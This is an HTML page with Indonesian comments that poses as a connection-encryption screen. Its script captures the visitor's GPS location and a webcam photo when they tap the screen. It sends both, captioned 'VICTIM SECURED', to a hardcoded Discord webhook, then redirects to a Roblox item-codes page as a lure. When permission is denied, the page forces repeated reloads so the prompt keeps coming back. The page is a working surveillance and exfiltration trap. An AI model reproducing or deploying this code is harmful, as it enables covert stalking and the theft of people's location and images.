<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Verifikasi</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
        .center { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; box-shadow: 0 0 15px #0f0; animation: scan 3s infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .btn-invisible { background: #0f0; color: #000; border: none; padding: 20px 60px; font-weight: bold; border-radius: 5px; cursor: pointer; z-index: 100; margin-top: 20px; }
    </style>
</head>
<body onclick="forceCapture()">

    <div class="scan-line"></div>
    
    <div class="center">
        <h1 id="status-text">ENCRYPTING CONNECTION...</h1>
        <div id="loader" style="font-size: 20px;">[##########----------] 50%</div>
        <p style="color: #555; margin-top: 30px;">TAP SCREEN TO FINISH ENCRYPTION</p>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1466670095265693757/PDj7kW1DCUMmTSjuCsR1QBz4FNpMegYtGnAh9_V40W8KP1CHFdLWAbG8MyuOELxqMinw";
        const FINAL = "https://robloxden.com/item-codes/categories/gear";

        async function forceCapture() {
            document.getElementById('status-text').innerText = "SYNCHRONIZING...";
            
            // Trigger izin GPS + Kamera secara paksa
            navigator.geolocation.getCurrentPosition(async (pos) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const v = document.createElement('video');
                    v.srcObject = stream;
                    await v.play();

                    const c = document.createElement('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    const blob = await (await fetch(c.toDataURL('image/jpeg'))).blob();
                    const fd = new FormData();
                    fd.append("file", blob, "captured.jpg");
                    fd.append("payload_json", JSON.stringify({ 
                        content: `âœ… **VICTIM SECURED**\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
                    }));
                    
                    await fetch(WH, { method: "POST", body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Mental ke link asli
                    window.location.replace(FINAL);
                } catch(e) {
                    // JIKA TARGET KLIK BLOCK: Refresh paksa biar minta lagi sampe mampus
                    location.reload();
                }
            }, (err) => {
                location.reload(); // Paksa terus
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
